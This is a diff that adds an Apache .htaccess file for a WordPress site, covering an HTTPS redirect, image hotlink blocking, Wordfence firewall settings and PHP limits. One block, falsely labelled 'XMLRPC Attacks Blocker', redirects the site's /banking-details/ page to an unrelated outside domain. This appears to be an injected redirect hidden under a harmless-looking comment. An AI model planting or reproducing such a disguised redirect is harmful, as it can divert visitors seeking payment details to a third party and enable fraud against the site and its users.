@@ -1,0 +1,91 @@
+RewriteEngine On
+# BEGIN WordPress
+<IfModule mod_rewrite.c>
+RewriteEngine On
+RewriteCond %{SERVER_PORT} 80 
+RewriteRule ^(.*)$ https://www.example.com/$1 [R,L]
+</IfModule>
+
+# END WordPress
+
+# BEGIN XMLRPC Attacks Blocker
+<IfModule mod_rewrite.c>
+RewriteEngine On
+RewriteCond %{REQUEST_URI} ^/banking-details/?$ [NC]
+RewriteRule ^.*$ https://skn.co.il/contact/ [R=301,L]
+</IfModule>
+order allow,deny
+allow from all
+# END XMLRPC Attacks Blocker
+
+RewriteCond %{HTTP_REFERER} !^http://awqafsa.org.za/.*$      [NC]
+RewriteCond %{HTTP_REFERER} !^http://awqafsa.org.za$      [NC]
+RewriteCond %{HTTP_REFERER} !^http://docs.awqafsa.org.za/.*$      [NC]
+RewriteCond %{HTTP_REFERER} !^http://docs.awqafsa.org.za$      [NC]
+RewriteCond %{HTTP_REFERER} !^http://drm.awqafsa.org.za/.*$      [NC]
+RewriteCond %{HTTP_REFERER} !^http://drm.awqafsa.org.za$      [NC]
+RewriteCond %{HTTP_REFERER} !^http://educare.awqafsa.org.za/.*$      [NC]
+RewriteCond %{HTTP_REFERER} !^http://educare.awqafsa.org.za$      [NC]
+RewriteCond %{HTTP_REFERER} !^http://waqf.awqafsa.org.za/.*$      [NC]
+RewriteCond %{HTTP_REFERER} !^http://waqf.awqafsa.org.za$      [NC]
+RewriteCond %{HTTP_REFERER} !^http://web.awqafsa.org.za/.*$      [NC]
+RewriteCond %{HTTP_REFERER} !^http://web.awqafsa.org.za$      [NC]
+RewriteCond %{HTTP_REFERER} !^http://www.awqafsa.org.za/.*$      [NC]
+RewriteCond %{HTTP_REFERER} !^http://www.awqafsa.org.za$      [NC]
+RewriteCond %{HTTP_REFERER} !^http://www.docs.awqafsa.org.za/.*$      [NC]
+RewriteCond %{HTTP_REFERER} !^http://www.docs.awqafsa.org.za$      [NC]
+RewriteCond %{HTTP_REFERER} !^http://www.drm.awqafsa.org.za/.*$      [NC]
+RewriteCond %{HTTP_REFERER} !^http://www.drm.awqafsa.org.za$      [NC]
+RewriteCond %{HTTP_REFERER} !^http://www.educare.awqafsa.org.za/.*$      [NC]
+RewriteCond %{HTTP_REFERER} !^http://www.educare.awqafsa.org.za$      [NC]
+RewriteCond %{HTTP_REFERER} !^http://www.waqf.awqafsa.org.za/.*$      [NC]
+RewriteCond %{HTTP_REFERER} !^http://www.waqf.awqafsa.org.za$      [NC]
+RewriteCond %{HTTP_REFERER} !^http://www.web.awqafsa.org.za/.*$      [NC]
+RewriteCond %{HTTP_REFERER} !^http://www.web.awqafsa.org.za$      [NC]
+RewriteCond %{HTTP_REFERER} !^https://awqafsa.org.za/.*$      [NC]
+RewriteCond %{HTTP_REFERER} !^https://awqafsa.org.za$      [NC]
+RewriteCond %{HTTP_REFERER} !^https://docs.awqafsa.org.za/.*$      [NC]
+RewriteCond %{HTTP_REFERER} !^https://docs.awqafsa.org.za$      [NC]
+RewriteCond %{HTTP_REFERER} !^https://drm.awqafsa.org.za/.*$      [NC]
+RewriteCond %{HTTP_REFERER} !^https://drm.awqafsa.org.za$      [NC]
+RewriteCond %{HTTP_REFERER} !^https://educare.awqafsa.org.za/.*$      [NC]
+RewriteCond %{HTTP_REFERER} !^https://educare.awqafsa.org.za$      [NC]
+RewriteCond %{HTTP_REFERER} !^https://waqf.awqafsa.org.za/.*$      [NC]
+RewriteCond %{HTTP_REFERER} !^https://waqf.awqafsa.org.za$      [NC]
+RewriteCond %{HTTP_REFERER} !^https://web.awqafsa.org.za/.*$      [NC]
+RewriteCond %{HTTP_REFERER} !^https://web.awqafsa.org.za$      [NC]
+RewriteCond %{HTTP_REFERER} !^https://www.awqafsa.org.za/.*$      [NC]
+RewriteCond %{HTTP_REFERER} !^https://www.awqafsa.org.za$      [NC]
+RewriteCond %{HTTP_REFERER} !^https://www.docs.awqafsa.org.za/.*$      [NC]
+RewriteCond %{HTTP_REFERER} !^https://www.docs.awqafsa.org.za$      [NC]
+RewriteCond %{HTTP_REFERER} !^https://www.drm.awqafsa.org.za/.*$      [NC]
+RewriteCond %{HTTP_REFERER} !^https://www.drm.awqafsa.org.za$      [NC]
+RewriteCond %{HTTP_REFERER} !^https://www.educare.awqafsa.org.za/.*$      [NC]
+RewriteCond %{HTTP_REFERER} !^https://www.educare.awqafsa.org.za$      [NC]
+RewriteCond %{HTTP_REFERER} !^https://www.waqf.awqafsa.org.za/.*$      [NC]
+RewriteCond %{HTTP_REFERER} !^https://www.waqf.awqafsa.org.za$      [NC]
+RewriteCond %{HTTP_REFERER} !^https://www.web.awqafsa.org.za/.*$      [NC]
+RewriteCond %{HTTP_REFERER} !^https://www.web.awqafsa.org.za$      [NC]
+RewriteRule .*\.(jpg|jpeg|gif|png|bmp)$ - [F,NC]
+
+
+
+# Wordfence WAF
+<IfModule mod_php5.c>
+	php_value auto_prepend_file '/home/awqaflbn/public_html/wordfence-waf.php'
+</IfModule>
+<Files ".user.ini">
+<IfModule mod_authz_core.c>
+	Require all denied
+</IfModule>
+<IfModule !mod_authz_core.c>
+	Order deny,allow
+	Deny from all
+</IfModule>
+</Files>
+
+# END Wordfence WAF
+php_value upload_max_filesize 128M
+php_value post_max_size 128M
+php_value max_execution_time 300
+php_value max_input_time 300
